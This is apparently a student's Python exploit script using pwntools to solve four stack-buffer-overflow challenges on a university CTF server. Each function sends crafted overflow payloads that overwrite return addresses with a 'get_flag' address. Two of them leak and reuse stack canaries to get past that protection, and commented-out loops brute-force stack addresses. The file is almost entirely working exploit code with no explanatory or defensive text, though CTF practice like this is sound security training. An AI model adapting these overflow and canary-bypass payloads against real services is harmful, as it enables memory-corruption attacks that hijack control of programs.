import itertools

from pwn import *

url = 'ctf21.softwaresecurity.no'


def task00(port: int):
    conn = remote(url, port)
    first_send = conn.recv(1024)
    print(first_send)
    line = b'a' * 16 + b'\x8b\xef\xbe\x79'
    conn.sendline(line)
    print(conn.recvline())
    print(conn.recvline())
    conn.close()


def task01(port: int):
    conn = remote(url, port)
    print(conn.recvline())
    send = b'a' * 16 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'
    conn.sendline(send)
    print(conn.recvall())
    conn.close()


def task02(port: int):
    conn = remote(url, port)
    print(conn.recvline())
    send = b'16'
    conn.sendline(send)

    # print(f"Send #1 {send}")
    fetc = conn.recvline()
    bfore = b'\x00' * 24
    print(f"The canari is: {int(fetc)}")
    canari = p64(int(fetc))
    after = b'\x00' * 8  # p64(0x0)
    get_flag = p64(0x4007f7)
    # print(f"#2 {bfore, canari, after, get_flag}")
    conn.sendline(bfore + canari + after + get_flag)
    # conn.send()
    print(conn.recvline())
    print(conn.recvline())
    print(conn.recvline())
    conn.close()


def task03(port: int):
    conn = remote(url, port)
    print(conn.recvline())
    first = b'1' * 32
    thirty_two_bytes = p64(0x01) * 4
    # buffer begins eca0
    get_flag_Addr = p64(0x00000000004011d6)

    possible = list(map(''.join, itertools.product('0123456789abcdef', repeat=2)))

    #buffer found from bf attack that buffer starts at:
    buffer_start = p64(0x00007fffffffeca0)
    # pt_0 = 00007fffffffecbc
    # canari = 00007fffffffeccc med verdien 55123e1d30298c00

    """
    for first in range(len(possible)):
        for second in range(0, len(possible)):
            string_ = "00007fffffff" + "ec"+ possible[second]
            bruteforce = p64(int(string_, 16))
            combined_output = b'a' * 32 + bruteforce
            # print(f"I´ve sendt this: {bruteforce}")
            conn.sendline(combined_output)
            output = (conn.recvline().decode().strip())

            if output != "0":
                print(f" {output} with this {string_}")
            try:
                conn.sendline(combined_output)
            except:
                print("fail!")
                conn = connect(url, 7003)
                conn.recvline()
            # print(output)
            conn.recvline()

    values = ""
    """
    list_of_possibles = []
    """
        for x in range(32):
            address_space = p64(0x00007fffffffecc0 + 8 * x)
            conn.sendline(b'a'*32 + address_space)
            list_of_possibles.append(address_space)
            conn.recvline()
            # print(f"possible canari: {conn.recvline() } \n at adress {address_space}")
            conn.recvline()
    """
    conn.sendline(b'a'*32 + p64(0x00007fffffffecc8))
    canary = int(conn.recvline().strip(), 16)

    payload = b'q' + b'a'*31 + get_flag_Addr + p64(canary) + p64(0x0) + get_flag_Addr
    conn.sendline(payload)
    print(conn.recvline())
    print(conn.recvline())
    print(conn.recvline())


def test(port: int):
    conn = remote(url, port)
    print(conn.recvline())

    while True:
        conn.send(b'1' * 32 + b'')


if __name__ == '__main__':
    # task00(7000)
    # task01(7001)
    # task02(7002)
    task03(7003)
